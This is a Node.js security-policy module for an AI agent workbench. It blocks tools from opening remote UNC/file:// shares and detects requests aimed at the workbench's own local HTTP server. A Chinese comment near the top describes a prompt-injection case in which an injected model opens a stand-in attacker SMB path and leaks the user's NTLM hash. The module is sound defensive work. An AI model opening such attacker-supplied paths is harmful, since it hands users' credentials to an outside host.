'use strict';

const { URL } = require('node:url');
const { embeddedIpv4FromV6 } = require('./network-policy.cjs');
const os = require('node:os');
const path = require('node:path');

function createToolTargetPolicy({
  RUNTIME, readConfig, remoteUncDenialResolved,
}) {

  // 3.0 收口走查(第四波):打开类工具(office_open / browser_open)同样在【任何 I/O 之前】拒非本机 UNC(\\主机\共享、file://主机/共享)。
  // 修前它们不经 guardFileToolPath:智能自动档里 exec 工具默认放行,被注入的模型 office_open「\\攻击者\s\a.pdf」→ explorer 去连对方的 SMB,
  // 本机用户的 NTLM 哈希就递出去了(非安全扩展名那一支的 fsp.stat 也会先连)。判据与文件工具同一份(03 remoteUncDenialResolved:
  // 本机主机名不算外联、用户配成工作区的共享照旧放行)。http(s) 网址不在此列。返回命中的主机名,'' = 不拦。
  async function openToolUncDenied(rawTarget, ctx) {
    const raw = String(rawTarget == null ? '' : rawTarget).trim();
    if (!raw || /^https?:\/\//i.test(raw)) return '';
    const candidates = [raw];
    if (/^file:/i.test(raw)) {
      try {
        const u = new URL(raw);
        if (u.hostname) candidates.push('\\\\' + u.hostname + decodeURIComponent(u.pathname).replace(/\//g, '\\'));
      } catch { /* 解析不了的 file: 网址交给后面的打开逻辑报错 */ }
    } else {
      candidates.push(path.resolve(raw));
    }
    let config = ctx && ctx.config ? ctx.config : null;
    if (!config) { try { config = await readConfig(); } catch { config = {}; } }
    return remoteUncDenialResolved(candidates, (ctx && ctx.session) || null, config);
  }

  // 3.0 收口走查(第四波):url 是否落在如意自己的 HTTP 服务上 —— 端口等于本进程(serve)或父进程(MCP 子进程经 WCW_PORT)的监听端口,
  // 且主机是回环 / 未指定地址 / 本机名 / 本机网卡地址(--host 0.0.0.0 时局域网地址同样进得来)。主机先经 WHATWG URL 规范化,
  // 0x7f.1、2130706433、[::ffff:127.0.0.1] 这些写法都还原成标准形。解析不了 → false(交给 httpRequest 自己报错)。
  function httpRequestTargetsWorkbench(rawUrl) {
    let u;
    try { u = new URL(String(rawUrl == null ? '' : rawUrl).trim()); } catch { return false; }
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return false;
    const port = Number(u.port || (u.protocol === 'https:' ? 443 : 80));
    const own = [Number(process.env.WCW_PORT) || 0, Number(RUNTIME && RUNTIME.port) || 0].filter(Boolean);
    if (!own.includes(port)) return false;
    const host = u.hostname.replace(/^\[|\]$/g, '').replace(/\.+$/, '').toLowerCase();
    if (!host) return false;
    if (host === 'localhost' || host.endsWith('.localhost') || host === '::1' || host === '::' || host === '0.0.0.0' || /^127\./.test(host)) return true;
    const v4 = embeddedIpv4FromV6(host);
    if (v4 && (/^127\./.test(v4) || v4 === '0.0.0.0')) return true;
    try { if (host === String(os.hostname() || '').toLowerCase()) return true; } catch { /* 取不到主机名就不按名字认 */ }
    try {
      for (const list of Object.values(os.networkInterfaces() || {})) {
        for (const a of (list || [])) if (String(a && a.address || '').toLowerCase() === host) return true;
      }
    } catch { /* 取不到网卡表就只认回环 */ }
    return false;
  }

  return { httpRequestTargetsWorkbench, openToolUncDenied };
}

module.exports = { createToolTargetPolicy };
